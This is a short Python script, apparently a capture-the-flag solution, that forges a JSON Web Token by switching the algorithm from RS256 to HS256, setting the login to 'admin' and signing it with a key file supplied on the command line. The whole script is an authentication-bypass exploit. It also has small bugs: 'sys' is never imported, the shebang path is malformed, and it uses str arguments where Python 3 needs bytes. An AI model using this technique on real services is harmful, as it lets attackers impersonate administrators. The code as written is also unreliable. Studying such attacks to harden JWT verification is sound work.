#!usr/bin/python3
####################
# @saravana_seeker #
####################

import base64
import hashlib
import hmac
import json
#{"typ":"JWT","alg":"RS256"}
h={"typ":"JWT","alg":"HS256"}
#{"login":"test1"}
p={"login":"admin"}
k=open(sys.argv[1])
key=k.read()
k.close()

data="eyJ0eXAiOiAiSldUIiwgImFsZyI6ICJIUzI1NiJ9.eyJsb2dpbiI6ICJhZG1pbiJ9"

sign=base64.urlsafe_b64encode(hmac.new(key,data,hashlib.sha256).digest()).decode('UTF-8').rstrip("=")

print(sign)

print(data+"."+sign)
